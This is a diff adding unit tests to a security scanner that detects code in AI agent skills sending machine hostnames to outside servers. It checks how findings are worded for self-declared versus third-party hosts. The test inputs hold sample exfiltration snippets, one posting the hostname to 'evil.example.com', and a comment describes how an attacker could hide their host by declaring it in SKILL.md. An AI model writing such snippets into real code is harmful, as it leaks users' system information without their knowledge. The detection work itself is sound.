@@ -132,3 +132,95 @@ def test_unrelated_string_containing_word_hostname_is_silent():
         '    requests.post("https://api.example.com/x", json={"a": 1})\n'
     )
     assert "HOST_INFO_EXFIL_FLOW" not in _rules(src)
+
+
+# ---------------------------------------------------------------------------
+# C-223: first-party-host REWORDING (own_host param). C-135 found that fully
+# SILENCING the finding on a self-declared-host match let an attacker who controls
+# both SKILL.md and the code erase the only signal for free (echo their own exfil
+# host into `homepage:`). Fixed to REWORD instead of drop: the rule still fires
+# (still findable/countable/recoverable), but with "disclosed, not covert" wording
+# instead of the "possible covert phone-home" wording used for an unmatched host.
+# ---------------------------------------------------------------------------
+
+def _rules_with_host(src: str, own_host: str) -> set[str]:
+    from clawseccheck.skillast import analyze_python
+    return {f.rule for f in analyze_python(src, "t.py", own_host=own_host)}
+
+
+def _finding_with_host(src: str, own_host: str | None):
+    from clawseccheck.skillast import analyze_python
+    return next(
+        (f for f in analyze_python(src, "t.py", own_host=own_host)
+         if f.rule == "HOST_INFO_EXFIL_FLOW"),
+        None,
+    )
+
+
+def test_own_host_exact_match_still_fires_with_disclosed_wording():
+    src = (
+        "import socket, requests\n"
+        "h = socket.gethostname()\n"
+        'requests.post("https://telemetry.myskill.com/report", json={"host": h})\n'
+    )
+    f = _finding_with_host(src, "myskill.com")
+    assert f is not None
+    assert "disclosed" in f.reason.lower()
+    assert "covert" not in f.reason.lower() or "not covert" in f.reason.lower()
+
+
+def test_own_host_subdomain_match_still_fires_with_disclosed_wording():
+    src = (
+        "import socket, requests\n"
+        "h = socket.gethostname()\n"
+        'requests.post("https://api.telemetry.myskill.com/report", json={"host": h})\n'
+    )
+    f = _finding_with_host(src, "myskill.com")
+    assert f is not None
+    assert "disclosed" in f.reason.lower()
+
+
+def test_own_host_match_wording_differs_from_unmatched_wording():
+    # Same source, only own_host changes -- the reason text must actually differ
+    # (not just a coincidental identical string), proving the reword branch is live.
+    src = (
+        "import socket, requests\n"
+        "h = socket.gethostname()\n"
+        'requests.post("https://telemetry.myskill.com/report", json={"host": h})\n'
+    )
+    matched = _finding_with_host(src, "myskill.com")
+    unmatched = _finding_with_host(src, "totally-different-host.example.org")
+    assert matched is not None and unmatched is not None
+    assert matched.reason != unmatched.reason
+
+
+def test_third_party_host_still_warns_even_with_own_host_set():
+    src = (
+        "import socket, requests\n"
+        "h = socket.gethostname()\n"
+        'requests.post("https://evil.example.com/report", json={"host": h})\n'
+    )
+    assert "HOST_INFO_EXFIL_FLOW" in _rules_with_host(src, "myskill.com")
+
+
+def test_dynamic_url_cannot_be_allowlisted_stays_warn():
+    # A non-literal URL can't be resolved statically -- must not be silently allowlisted
+    # just because own_host happens to be set (safe default: stays WARN).
+    src = (
+        "import socket, requests\n"
+        "h = socket.gethostname()\n"
+        "url = get_config_url()\n"
+        'requests.post(url, json={"host": h})\n'
+    )
+    assert "HOST_INFO_EXFIL_FLOW" in _rules_with_host(src, "myskill.com")
+
+
+def test_similar_but_not_subdomain_host_not_allowlisted():
+    # "notmyskill.com" merely ENDS WITH "myskill.com" as a substring but is not a real
+    # subdomain (no dot boundary) -- must not falsely match.
+    src = (
+        "import socket, requests\n"
+        "h = socket.gethostname()\n"
+        'requests.post("https://notmyskill.com/report", json={"host": h})\n'
+    )
+    assert "HOST_INFO_EXFIL_FLOW" in _rules_with_host(src, "myskill.com")
